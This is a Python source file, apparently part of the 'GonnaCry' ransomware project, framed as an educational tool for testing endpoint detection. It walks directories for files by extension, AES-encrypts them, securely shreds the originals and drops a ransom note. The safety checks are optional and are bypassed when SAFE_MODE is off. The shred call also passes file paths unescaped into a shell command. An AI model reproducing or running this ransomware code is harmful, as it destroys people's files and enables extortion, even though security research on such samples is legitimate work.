"""
File Operations Module for GonnaCry
Handles file discovery, encryption, and safety checks
"""

import os
import shutil
from pathlib import Path
from ..config.settings import (
    SUPPORTED_EXTENSIONS, 
    SAFE_MODE, 
    SAFE_DIRECTORIES,
    TEST_MODE,
    TEST_DIRECTORY,
    IOC_MARKERS
)


def is_safe_directory(path):
    """Check if path is in a safe directory that shouldn't be encrypted"""
    if not SAFE_MODE:
        return True
    
    path_str = str(Path(path).resolve())
    for safe_dir in SAFE_DIRECTORIES:
        if path_str.startswith(safe_dir):
            return False
    return True


def should_encrypt_file(filepath):
    """Check if file should be encrypted based on extension and safety"""
    path = Path(filepath)
    
    # Check if in safe directory
    if not is_safe_directory(path.parent):
        return False
    
    # Check extension
    if path.suffix.lower() not in SUPPORTED_EXTENSIONS:
        return False
    
    # Skip already encrypted files
    if path.suffix == IOC_MARKERS['file_extension']:
        return False
    
    # Skip system files
    if path.name.startswith('.'):
        return False
    
    return True


def find_files(directory, recursive=True):
    """Find all encryptable files in directory"""
    files = []
    path = Path(directory)
    
    if not path.exists():
        return files
    
    if recursive:
        iterator = path.rglob('*')
    else:
        iterator = path.glob('*')
    
    for filepath in iterator:
        if filepath.is_file() and should_encrypt_file(filepath):
            files.append(filepath)
    
    return files


def get_test_files():
    """Get files from test directory for EDR testing"""
    if TEST_MODE:
        test_path = Path(TEST_DIRECTORY)
        if test_path.exists():
            return find_files(test_path)
    return []


def encrypt_file(filepath, aes_cipher, output_path=None):
    """
    Encrypt a single file
    
    Args:
        filepath: Path to file to encrypt
        aes_cipher: AESCipher instance with key
        output_path: Optional output path (default: original + .GNCRY)
    
    Returns:
        Tuple of (encrypted_path, aes_key) or None on failure
    """
    try:
        # Read file content
        with open(filepath, 'rb') as f:
            content = f.read()
        
        # Encrypt content
        encrypted_content = aes_cipher.encrypt(content)
        
        # Determine output path
        if output_path is None:
            output_path = str(filepath) + IOC_MARKERS['file_extension']
        
        # Write encrypted file
        with open(output_path, 'wb') as f:
            f.write(encrypted_content)
        
        # Secure delete original (shred if available, otherwise overwrite)
        secure_delete(filepath)
        
        return output_path, aes_cipher.key
    
    except Exception as e:
        print(f"Error encrypting {filepath}: {e}")
        return None


def decrypt_file(filepath, aes_key, output_path=None):
    """
    Decrypt a single file
    
    Args:
        filepath: Path to encrypted file
        aes_key: AES key for decryption
        output_path: Optional output path (default: original without .GNCRY)
    
    Returns:
        Decrypted file path or None on failure
    """
    try:
        from ..core.crypto import AESCipher
        
        # Read encrypted content
        with open(filepath, 'rb') as f:
            encrypted_content = f.read()
        
        # Decrypt content
        cipher = AESCipher(aes_key)
        decrypted_content = cipher.decrypt(encrypted_content)
        
        # Determine output path
        if output_path is None:
            output_path = str(filepath).replace(IOC_MARKERS['file_extension'], '')
        
        # Write decrypted file
        with open(output_path, 'wb') as f:
            f.write(decrypted_content)
        
        return output_path
    
    except Exception as e:
        print(f"Error decrypting {filepath}: {e}")
        return None


def secure_delete(filepath):
    """Securely delete a file by overwriting before removal"""
    try:
        path = Path(filepath)
        if not path.exists():
            return
        
        # Try using shred command first
        if shutil.which('shred'):
            os.system(f'shred -u "{filepath}" 2>/dev/null')
        else:
            # Fallback: overwrite with random data then delete
            file_size = path.stat().st_size
            with open(filepath, 'wb') as f:
                f.write(os.urandom(file_size))
                f.flush()
                os.fsync(f.fileno())
            path.unlink()
    
    except Exception as e:
        print(f"Error securely deleting {filepath}: {e}")
        try:
            Path(filepath).unlink()
        except:
            pass


def create_ransom_note(directory):
    """Create ransom note in directory"""
    note_path = Path(directory) / IOC_MARKERS['ransom_note']
    
    note_content = """
═══════════════════════════════════════════════════════
                    YOUR FILES ARE ENCRYPTED
═══════════════════════════════════════════════════════

This is a test encryption for EDR/Security research.

If this were a real attack, your files would be 
unrecoverable without the decryption key.

For EDR Testing:
- Check for .GNCRY file extensions
- Monitor for AES-256-CBC encryption patterns
- Look for RSA-2048 key exchange attempts
- Review process behavior and IOCs

═══════════════════════════════════════════════════════
GonnaCry v2.0 - Educational Security Research Tool
═══════════════════════════════════════════════════════
""".strip()
    
    try:
        with open(note_path, 'w') as f:
            f.write(note_content)
        return note_path
    except Exception as e:
        print(f"Error creating ransom note: {e}")
        return None
